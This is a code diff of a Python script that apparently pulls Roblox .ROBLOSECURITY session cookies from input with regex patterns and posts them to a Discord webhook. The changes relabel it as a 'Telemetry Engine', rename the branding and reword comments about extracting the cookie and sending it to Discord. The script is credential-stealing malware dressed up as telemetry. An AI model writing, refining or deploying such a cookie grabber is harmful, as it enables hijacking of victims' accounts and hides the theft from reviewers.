@@ -36,6 +36,7 @@ def main():
             print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
 
+        # Extract cookie or payload from input
         roblosecurity = None
         patterns = [
             r'(_\|WARNING:[^"\']+)',
@@ -169,11 +170,11 @@ def main():
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
-                "footer": { "text": "NexusStudio Telemetry Engine • 2026" }
+                "footer": { "text": "RBXDEV Telemetry Engine • 2026" }
             }]
         }
 
-        # Safe exponential backoff retry handler
+        # Send to Discord with exponential backoff retry handler
         for attempt in range(4):
             res = requests.post(webhook_url, json=payload, timeout=10)
             print(f"DEBUG: Discord Webhook Post Status: {res.status_code}", file=sys.stderr)
